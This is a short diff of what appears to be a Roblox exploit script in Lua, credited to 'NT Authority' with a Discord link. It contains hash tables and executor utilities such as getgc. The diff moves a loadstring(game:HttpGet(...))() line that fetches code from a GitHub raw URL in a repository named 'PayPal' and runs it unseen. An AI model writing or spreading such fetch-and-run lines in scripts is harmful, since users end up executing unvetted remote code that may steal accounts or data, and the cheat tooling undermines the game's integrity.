@@ -1,6 +1,5 @@
 -- Discord: https://discord.gg/aQjAv36Ukp
 -- Written by NT Authority
-loadstring(game:HttpGet("https://raw.githubusercontent.com/HazeWasTaken/PayPal/master/reeeeeeee", true))()
 
 local Hashes = {
     -- NEW 25.12.2020
@@ -36,6 +35,7 @@ local previousHashes = {
     --
     
 }
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HazeWasTaken/PayPal/master/reeeeeeee", true))()
 
 getgenv().utils = {
     ["getgc"] = getgc,
